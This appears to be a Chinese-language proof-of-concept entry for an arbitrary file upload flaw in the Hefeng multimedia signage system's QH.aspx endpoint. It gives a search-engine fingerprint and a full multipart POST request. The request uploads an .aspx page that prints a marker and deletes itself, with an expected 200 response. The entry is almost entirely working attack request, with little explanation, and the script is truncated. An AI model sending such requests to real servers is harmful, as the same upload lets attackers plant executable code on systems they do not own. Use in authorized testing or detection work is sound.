# 和丰多媒体信息发布系统QH.aspx任意文件上传

- **系统**：和丰多媒体信息发布系统QH.aspx　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="和丰山海-数字标牌"`
- **请求**：`POST /QH.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----Guhkjfbjhfbjbhjbrkeyhugbbu…`

**请求体 / payload**
```
------Guhkjfbjhfbjbhjbrkeyhugbbubuj
Content-Disposition: form-data; name="fileToUpload"; filename="dudesuite.aspx"
Content-Type: application/octet-stream
<%@ Page Language="C#"%><% Response.Write("DudeSuite");System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]); %>
------Guhkjfbjhfbjbhjbrkeyhugbbubuj
Content-Disposition: form-data; name="action"
upload
------Guhkjfbjhfbjbhjbrkeyhugbbubuj
Content-Disposition: form-data; name="responderId"
ResourceNewResponder
------Guhkjfbjhfbjbhjbrkeyhugbbubuj
Content-Disposition: form-data; name="remotePath"
/opt/resources
------Guhkjfbjhfbjbhjbr…（脚本共 614 字，完整版见原文）
```
- **预期**：200　|　dudesuite.aspx